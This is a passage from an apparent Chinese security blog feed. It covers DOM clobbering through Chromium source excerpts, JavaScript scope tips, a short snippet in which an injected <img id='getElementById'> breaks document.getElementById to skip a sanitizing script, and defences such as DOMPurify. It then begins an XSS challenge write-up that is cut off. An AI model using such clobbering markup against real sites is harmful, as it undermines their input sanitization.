title="Cookie"></a>Cookie</h3><p>&#x8FD9;&#x91CC;&#x7B80;&#x5355;&#x770B;&#x4E86;&#x4E00;&#x4E0B; Cookie &#x7684;&#x5B9E;&#x73B0;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x8FD9;&#x4E24;&#x90E8;&#x5206;&#x4EE3;&#x7801;&#xFF1A;</p><p><a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/dom/document.cc;l=5798" target="_blank" rel="noopener">Document::cookie</a></p><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">String</span> <span class="hljs-title">Document::cookie</span><span class="hljs-params">(ExceptionState&amp; exception_state)</span> <span class="hljs-keyword">const</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">if</span> (GetSettings() &amp;&amp; !GetSettings()-&gt;GetCookieEnabled())</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">String</span>();</span><br><span class="line"></span><br><span class="line">  CountUse(WebFeature::kCookieGet);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (!GetSecurityOrigin()-&gt;CanAccessCookies()) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (IsSandboxed(mojom::<span class="hljs-built_in">blink</span>::WebSandboxFlags::kOrigin))</span><br><span class="line">      exception_state.ThrowSecurityError(</span><br><span class="line">          <span class="hljs-string">&quot;The document is sandboxed and lacks the &apos;allow-same-origin&apos; flag.&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Url().ProtocolIs(<span class="hljs-string">&quot;data&quot;</span>))</span><br><span class="line">      exception_state.ThrowSecurityError(</span><br><span class="line">          <span class="hljs-string">&quot;Cookies are disabled inside &apos;data:&apos; URLs.&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">      exception_state.ThrowSecurityError(<span class="hljs-string">&quot;Access is denied for this document.&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">String</span>();</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (GetSecurityOrigin()-&gt;IsLocal()) {</span><br><span class="line">    CountUse(WebFeature::kFileAccessedCookies);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (!cookie_jar_)</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">String</span>();</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> cookie_jar_-&gt;Cookies();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p><a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/loader/cookie_jar.cc;drc=76ccbe80ceaa4529956a6a3d9d8cc9e9a44b1904;l=27?originalUrl=https:%2F%2Fcs.chromium.org%2F" target="_blank" rel="noopener">CookieJar::Cookies()</a></p><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">String</span> <span class="hljs-title">CookieJar::Cookies</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">  KURL cookie_url = document_-&gt;CookieURL();</span><br><span class="line">  <span class="hljs-keyword">if</span> (cookie_url.IsEmpty())</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">String</span>();</span><br><span class="line"></span><br><span class="line">  RequestRestrictedCookieManagerIfNeeded();</span><br><span class="line">  <span class="hljs-keyword">String</span> value;</span><br><span class="line">  backend_-&gt;GetCookiesString(cookie_url, document_-&gt;SiteForCookies(),</span><br><span class="line">                             document_-&gt;TopFrameOrigin(), &amp;value);</span><br><span class="line">  <span class="hljs-keyword">return</span> value;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4EE5;&#x53CA;&#xFF0C;&#x867D;&#x7136; cookie &#x4E0D;&#x80FD;&#x88AB;&#x5B8C;&#x5168;&#x5B57;&#x7B26;&#x4E32;&#x5316;&#x63A7;&#x5236;&#xFF0C;&#x4F46;&#x662F;&#x53EF;&#x4EE5;&#x88AB; Clobbered &#x7684;&#x95EE;&#x9898;&#x5728;2&#x5E74;&#x524D;&#x4E5F;&#x6709;&#x4EBA;&#x62A5;&#x544A;&#x8FC7;&#x8FD9;&#x4E2A;&#x76F8;&#x5173;&#x7684;&#x95EE;&#x9898; <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1420032" target="_blank" rel="noopener">document.cookie DOM property can be clobbered using DOM node named cookie</a></p><p>&#x53EA;&#x4E0D;&#x8FC7;&#x76EE;&#x524D;&#x7684;&#x4E3B;&#x6D41;&#x6D4F;&#x89C8;&#x5668;&#x90FD;&#x662F;&#x201D;Safari, Chrome and Firefox all behave the same here&#x201D;&#x3002;</p><h3 id="Document-Collection"><a href="#Document-Collection" class="headerlink" title="Document Collection"></a>Document Collection</h3><p>&#x6D89;&#x53CA;&#x5230; Collection &#x7684; Document &#x90E8;&#x5206;&#xFF1A;</p><p><a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/html/document_name_collection.cc;l=24?originalUrl=https:%2F%2Fcs.chromium.org%2F" target="_blank" rel="noopener">DocumentNameCollection::ElementMatches</a></p><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">DocumentNameCollection::ElementMatches</span><span class="hljs-params">(<span class="hljs-keyword">const</span> HTMLElement&amp; element)</span> <span class="hljs-keyword">const</span> </span>{</span><br><span class="line">  <span class="hljs-comment">// Match images, forms, embeds, objects and iframes by name,</span></span><br><span class="line">  <span class="hljs-comment">// object by id, and images by id but only if they have</span></span><br><span class="line">  <span class="hljs-comment">// a name attribute (this very strange rule matches IE)</span></span><br><span class="line">  <span class="hljs-keyword">auto</span>* html_embed_element = DynamicTo&lt;HTMLEmbedElement&gt;(&amp;element);</span><br><span class="line">  <span class="hljs-keyword">if</span> (IsA&lt;HTMLFormElement&gt;(element) || IsA&lt;HTMLIFrameElement&gt;(element) ||</span><br><span class="line">      (html_embed_element &amp;&amp; html_embed_element-&gt;IsExposed()))</span><br><span class="line">    <span class="hljs-keyword">return</span> element.GetNameAttribute() == name_;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">auto</span>* html_image_element = DynamicTo&lt;HTMLObjectElement&gt;(&amp;element);</span><br><span class="line">  <span class="hljs-keyword">if</span> (html_image_element &amp;&amp; html_image_element-&gt;IsExposed())</span><br><span class="line">    <span class="hljs-keyword">return</span> element.GetNameAttribute() == name_ ||</span><br><span class="line">           element.GetIdAttribute() == name_;</span><br><span class="line">  <span class="hljs-keyword">if</span> (IsA&lt;HTMLImageElement&gt;(element)) {</span><br><span class="line">    <span class="hljs-keyword">const</span> AtomicString&amp; name_value = element.GetNameAttribute();</span><br><span class="line">    <span class="hljs-keyword">return</span> name_value == name_ ||</span><br><span class="line">           (element.GetIdAttribute() == name_ &amp;&amp; !name_value.IsEmpty());</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Window-Collection"><a href="#Window-Collection" class="headerlink" title="Window Collection"></a>Window Collection</h3><p>&#x6D89;&#x53CA;&#x5230; Collection &#x7684; Window &#x90E8;&#x5206;&#xFF1A;</p><p><a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/html/window_name_collection.cc;l=22?originalUrl=https:%2F%2Fcs.chromium.org%2F" target="_blank" rel="noopener">WindowNameCollection::ElementMatches</a></p><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">WindowNameCollection::ElementMatches</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Element&amp; element)</span> <span class="hljs-keyword">const</span> </span>{</span><br><span class="line">  <span class="hljs-comment">// Match only images, forms, embeds and objects by name,</span></span><br><span class="line">  <span class="hljs-comment">// but anything by id</span></span><br><span class="line">  <span class="hljs-keyword">if</span> (IsA&lt;HTMLImageElement&gt;(element) || IsA&lt;HTMLFormElement&gt;(element) ||</span><br><span class="line">      IsA&lt;HTMLEmbedElement&gt;(element) || IsA&lt;HTMLObjectElement&gt;(element)) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (element.GetNameAttribute() == name_)</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> element.GetIdAttribute() == name_;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="Bouns"><a href="#Bouns" class="headerlink" title="Bouns"></a>Bouns</h2><h3 id="Tip-1-Global-Scope"><a href="#Tip-1-Global-Scope" class="headerlink" title="Tip 1 Global Scope"></a>Tip 1 Global Scope</h3><p>&#x7531;&#x4E8E; Dom Clobbering &#x5229;&#x7528;&#x65B9;&#x5F0F;&#x4E4B;&#x4E00;&#x5C31;&#x662F; hook &#x5168;&#x5C40;&#x4F5C;&#x7528;&#x57DF;&#x4E0B;&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x53C8;&#x7531;&#x4E8E; Javascript &#x662F;&#x4E00;&#x95E8;&#x5341;&#x5206;&#x795E;&#x5947;&#x7684;&#x8BED;&#x8A00;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x5982;&#x4E0B;&#x51E0;&#x70B9;</p><h4 id="&#x663E;&#x5F0F;&#x58F0;&#x660E;"><a href="#&#x663E;&#x5F0F;&#x58F0;&#x660E;" class="headerlink" title="&#x663E;&#x5F0F;&#x58F0;&#x660E;"></a>&#x663E;&#x5F0F;&#x58F0;&#x660E;</h4><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-keyword">var</span> a = <span class="hljs-number">1</span>;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">let</span> b = <span class="hljs-number">2</span>;</span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-keyword">var</span> c = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">()</span> </span>{};</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">window</span>.a);<span class="hljs-comment">//1</span></span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">window</span>.b);<span class="hljs-comment">//undefined</span></span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">window</span>.c);<span class="hljs-comment">//&#x192; () {}</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="&#x9690;&#x5F0F;&#x58F0;&#x660E;"><a href="#&#x9690;&#x5F0F;&#x58F0;&#x660E;" class="headerlink" title="&#x9690;&#x5F0F;&#x58F0;&#x660E;"></a>&#x9690;&#x5F0F;&#x58F0;&#x660E;</h4><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span><span class="hljs-params">(a)</span></span>{</span></span><br><span class="line">    b = a + 1;</span><br><span class="line">  }</span><br><span class="line">  test(1);</span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">window</span>.b);<span class="hljs-comment">//2</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4E0D;&#x5E26;&#x6709;<strong>&#x58F0;&#x660E;&#x5173;&#x952E;&#x5B57;</strong>&#x7684;&#x53D8;&#x91CF;&#xFF0C;Javascript &#x4F1A;&#x81EA;&#x52A8;&#x6302;&#x8F7D;&#x5230;&#x5168;&#x5C40;&#x4F5C;&#x7528;&#x57DF;&#x4E0A;&#x3002;</p><h4 id="let-amp-var"><a href="#let-amp-var" class="headerlink" title="let &amp; var"></a>let &amp; var</h4><p>ES6 &#x4E2D;&#x65B0;&#x589E;&#x4E86;<code>let</code>&#x547D;&#x4EE4;&#xFF0C;&#x7528;&#x6765;&#x58F0;&#x660E;&#x53D8;&#x91CF;&#x3002;&#x5B83;&#x7684;&#x7528;&#x6CD5;&#x7C7B;&#x4F3C;&#x4E8E;<code>var</code>&#xFF0C;&#x4F46;&#x662F;&#x6240;&#x58F0;&#x660E;&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x53EA;&#x5728;<code>let</code>&#x547D;&#x4EE4;&#x6240;&#x5728;&#x7684;&#x4EE3;&#x7801;&#x5757;&#x5185;&#x6709;&#x6548;&#x3002;&#x8BE6;&#x7EC6;&#x53EF;&#x4EE5;&#x53C2;&#x8003; <a href="https://es6.ruanyifeng.com/#docs/let#&#x57FA;&#x672C;&#x7528;&#x6CD5;" target="_blank" rel="noopener">let &#x57FA;&#x672C;&#x7528;&#x6CD5;</a></p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">  <span class="hljs-keyword">let</span> a = <span class="hljs-number">10</span>;</span><br><span class="line">  <span class="hljs-keyword">var</span> b = <span class="hljs-number">1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">a <span class="hljs-comment">// ReferenceError: a is not defined.</span></span><br><span class="line">b <span class="hljs-comment">// 1</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4E0A;&#x9762;&#x4EE3;&#x7801;&#x5728;&#x4EE3;&#x7801;&#x5757;&#x4E4B;&#x4E2D;&#xFF0C;&#x5206;&#x522B;&#x7528;<code>let</code>&#x548C;<code>var</code>&#x58F0;&#x660E;&#x4E86;&#x4E24;&#x4E2A;&#x53D8;&#x91CF;&#x3002;&#x7136;&#x540E;&#x5728;&#x4EE3;&#x7801;&#x5757;&#x4E4B;&#x5916;&#x8C03;&#x7528;&#x8FD9;&#x4E24;&#x4E2A;&#x53D8;&#x91CF;&#xFF0C;&#x7ED3;&#x679C;<code>let</code>&#x58F0;&#x660E;&#x7684;&#x53D8;&#x91CF;&#x62A5;&#x9519;&#xFF0C;<code>var</code>&#x58F0;&#x660E;&#x7684;&#x53D8;&#x91CF;&#x8FD4;&#x56DE;&#x4E86;&#x6B63;&#x786E;&#x7684;&#x503C;&#x3002;&#x8FD9;&#x8868;&#x660E;&#xFF0C;<code>let</code>&#x58F0;&#x660E;&#x7684;&#x53D8;&#x91CF;&#x53EA;&#x5728;&#x5B83;&#x6240;&#x5728;&#x7684;&#x4EE3;&#x7801;&#x5757;&#x6709;&#x6548;&#x3002;</p><p>&#x800C;&#x4E14;&#x6709;&#x4E9B;&#x5F88;&#x5947;&#x5999;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x6BD4;&#x5982;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> a = b = <span class="hljs-number">6</span>;</span><br><span class="line"><span class="hljs-built_in">window</span>.a;<span class="hljs-comment">//undefined</span></span><br><span class="line"><span class="hljs-built_in">window</span>.b;<span class="hljs-comment">//6</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Tip-2-Overwrite-function"><a href="#Tip-2-Overwrite-function" class="headerlink" title="Tip 2 Overwrite function"></a>Tip 2 Overwrite function</h3><p>&#x867D;&#x7136;&#x53EF;&#x4EE5; Clobber &#x51FD;&#x6570;&#xFF0C;&#x4F46;&#x662F;&#x76EE;&#x524D;&#x6211;&#x6CA1;&#x627E;&#x5230;&#x4EC0;&#x4E48;&#x65B9;&#x6CD5;&#x8BA9;&#x4ED6;&#x6267;&#x884C;&#x6211;&#x4EEC; Clobber &#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x6216;&#x8005;&#x8BF4;&#x76EE;&#x524D;&#x8C8C;&#x4F3C;&#x4E5F;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x901A;&#x8FC7;&#x6807;&#x7B7E;&#x6765;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x6240;&#x4EE5;&#x53EA;&#x80FD;&#x662F;&#x5F15;&#x8D77;&#x4E00;&#x4E2A;&#x62A5;&#x9519;&#xFF0C;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&apos;getElementById&apos;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&apos;getElementById&apos;</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">var</span> a = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;x&apos;</span>);<span class="hljs-comment">//Uncaught TypeError: document.getElementById is not a function</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x867D;&#x7136;&#x53EA;&#x80FD;&#x5F15;&#x8D77;&#x62A5;&#x9519;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x4E00;&#x5B9A;&#x573A;&#x666F;&#x4E0B;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x6765;&#x7ED5;&#x8FC7;&#x4E00;&#x4E9B;&#x5224;&#x65AD;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&apos;getElementById&apos;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&apos;getElementById&apos;</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">var</span> a = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;x&apos;</span>);<span class="hljs-comment">//Uncaught TypeError: document.getElementById is not a function</span></span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-comment">//We must use sanitize a here.</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-comment">//We have sanitized a. We can trust a now!</span></span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-comment">//Do something with a.</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7B2C;&#x4E00;&#x4E2A; JS &#x4EE3;&#x7801;&#x5757;&#x867D;&#x7136;&#x5F15;&#x8D77;&#x4E86;&#x62A5;&#x9519;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x4F1A;&#x5F15;&#x8D77; JS &#x5B8C;&#x5168;&#x505C;&#x6B62;&#x6267;&#x884C;&#xFF0C;JS &#x4F1A;&#x8DF3;&#x8FC7;&#x8FD9;&#x4E2A;&#x62A5;&#x9519;&#x7684;&#x4EE3;&#x7801;&#x5757;&#xFF0C;&#x6267;&#x884C;&#x4E0B;&#x4E00;&#x4E2A;&#x4EE3;&#x7801;&#x5757;&#x3002;</p><h3 id="Tip-3-Prototype-Pollution"><a href="#Tip-3-Prototype-Pollution" class="headerlink" title="Tip 3 Prototype Pollution"></a>Tip 3 Prototype Pollution</h3><p>&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;&#x53EF;&#x4EE5;&#x5417;&#xFF1F;</p><p>&#x6211;&#x76EE;&#x524D;&#x5C1D;&#x8BD5;&#x7684;&#x65B9;&#x6CD5;&#x8FD8;&#x6CA1;&#x6210;&#x529F;&#xFF0C;&#x5982;&#x679C;&#x5E08;&#x5085;&#x5C1D;&#x8BD5;&#x6210;&#x529F;&#x4E86;&#x4E00;&#x5B9A;&#x8981;&#x8DDF;&#x6211;&#x5206;&#x4EAB;&#xFF01;</p><h2 id="Defence"><a href="#Defence" class="headerlink" title="Defence"></a>Defence</h2><ol><li>&#x6700;&#x7B80;&#x5355;&#x7684;&#x662F;&#x5224;&#x65AD;&#x6BCF;&#x4E2A;&#x53D8;&#x91CF;&#x9884;&#x671F;&#x7684;&#x7C7B;&#x578B;&#x4EE5;&#x907F;&#x514D;&#x975E;&#x9884;&#x671F;&#x7C7B;&#x578B;&#x7684;&#x7BE1;&#x6539;&#xFF0C;&#x4F8B;&#x5982;&#xFF0C;&#x53EF;&#x4EE5;&#x68C0;&#x67E5; Dom &#x8282;&#x70B9;&#x7684; attribute &#x5C5E;&#x6027;&#x662F;&#x5426;&#x5B9E;&#x9645;&#x4E0A;&#x662F; NamedNodeMap &#x7684;&#x5B9E;&#x4F8B;&#xFF0C;&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x786E;&#x4FDD;&#x8BE5;&#x5C5E;&#x6027;&#x662F;&#x4E00;&#x4E2A; attributes &#x5C5E;&#x6027;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x653B;&#x51FB;&#x8005;&#x63D2;&#x5165;&#x7684; HTMLElement&#x3002;</li><li>&#x6BD5;&#x7ADF;&#x8FD9;&#x79CD;&#x653B;&#x51FB;&#x4E3B;&#x8981;&#x51FA;&#x73B0;&#x5728;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x8FD9;&#x4E00;&#x5757;&#xFF0C;&#x6240;&#x4EE5;&#x4EE3;&#x7801;&#x89C4;&#x8303;&#x5341;&#x5206;&#x91CD;&#x8981;&#xFF01;</li><li>&#x4F7F;&#x7528;&#x7ECF;&#x8FC7;&#x6D4B;&#x8BD5;&#x7684;&#x5E93;&#xFF0C;&#x4F8B;&#x5982; DOMPurify &#x3002;</li></ol><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Nafeez-Dom-Flow-Untangling-The-DOM-For-More-Easy-Juicy-Bugs.pdf" target="_blank" rel="noopener">DOM FLOW UNTANGLING THE DOM FOR EASY BUGS</a></p><p><a href="http://d1iv3.me/2018/04/11/DOM-Clobbering-Attack/" target="_blank" rel="noopener">DOM Clobbering Attack</a></p><p><a href="https://portswigger.net/research/dom-clobbering-strikes-back" target="_blank" rel="noopener">DOM Clobbering strikes back</a></p><p><a href="http://www.thespanner.co.uk/2013/05/16/dom-clobbering/" target="_blank" rel="noopener">DOM Clobbering</a></p><p><a href="https://medium.com/@terjanq/dom-clobbering-techniques-8443547ebe94" target="_blank" rel="noopener">Clobbering the clobbered &#x2014; Advanced DOM Clobbering</a></p><p><a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/" target="_blank" rel="noopener">XSS in GMail&#x2019;s AMP4Email via DOM Clobbering</a></p><p>[DOM Clobbering Attack&#x5B66;&#x4E60;&#x8BB0;&#x5F55;.md](<a href="https://wonderkun.cc/2020/02/15/DOM" target="_blank" rel="noopener">https://wonderkun.cc/2020/02/15/DOM</a> Clobbering Attack&#x5B66;&#x4E60;&#x8BB0;&#x5F55;)</p><p><a href="https://cure53.de/dom" target="_blank" rel="noopener">Im DOM h&#xF6;rt Dich keiner schreien</a></p><p><a href="https://fastmail.blog/2015/12/20/sanitising-html-the-dom-clobbering-issue/" target="_blank" rel="noopener">Dec 20: Sanitising HTML &#x2013; the DOM clobbering issue</a></p><p><a href="https://juejin.im/post/5abb99e9f265da2392366824" target="_blank" rel="noopener">&#x8C08;&#x8C08; JavaScript &#x7684;&#x4F5C;&#x7528;&#x57DF;</a></p></body></html>]]></content>
        <author>
            <name><![CDATA[Zedd‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.zeddyu.info/2020/02/11/xssgame/</id>
        <title><![CDATA[XSS GAME]]></title>
        <updated>2020-05-05T17:31:59+08:00</updated>
        <link href="https://blog.zeddyu.info/2020/02/11/xssgame/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2020/02/11/xssgame/"><![CDATA[<html><head></head><body><p>&#x8FC7;&#x5E74;&#x671F;&#x95F4;&#x73A9;&#x4E86;&#x4E00;&#x4E0B;&#x56FD;&#x5916;&#x7684;&#x4E00;&#x4E2A; XSS GAME&#xFF0C;&#x6536;&#x83B7;&#x9887;&#x4E30;&#xFF0C;&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;&#x5B66;&#x4E60;&#x8FC7;&#x7A0B;&#x3002;&#x672C;&#x4EBA;&#x5BF9;&#x4E8E; JavaScript &#x4EE5;&#x53CA;&#x524D;&#x7AEF;&#x7684;&#x7406;&#x89E3;&#x4E0D;&#x6DF1;&#xFF0C;&#x6C34;&#x5E73;&#x4E5F;&#x4E0D;&#x9AD8;&#xFF0C;&#x5982;&#x679C;&#x6587;&#x7AE0;&#x6709;&#x758F;&#x6F0F;&#x4E4B;&#x5904;&#xFF0C;&#x8FD8;&#x8BF7;&#x5E08;&#x5085;&#x4EEC;&#x65A7;&#x6B63;&#x3002;</p><blockquote class="colorquote success"><p>&#x6587;&#x7AE0;&#x9996;&#x53D1;&#x4E8E;&#x5B89;&#x5168;&#x5BA2;&#xFF1A;<a href="https://www.anquanke.com/post/id/198496" target="_blank" rel="noopener">https://www.anquanke.com/post/id/198496</a></p></blockquote><a id="more"></a><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>&#x6240;&#x6709;&#x9898;&#x76EE;&#x7684;&#x76EE;&#x6807;&#x90FD;&#x662F;&#x5B9E;&#x73B0;<code>alert(1337)</code>&#x5373;&#x53EF;&#xFF0C;&#x6709;&#x7740;&#x4E0D;&#x540C;&#x7684;&#x96BE;&#x5EA6;</p><h2 id="Area-51"><a href="#Area-51" class="headerlink" title="Area 51"></a>Area 51</h2><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span 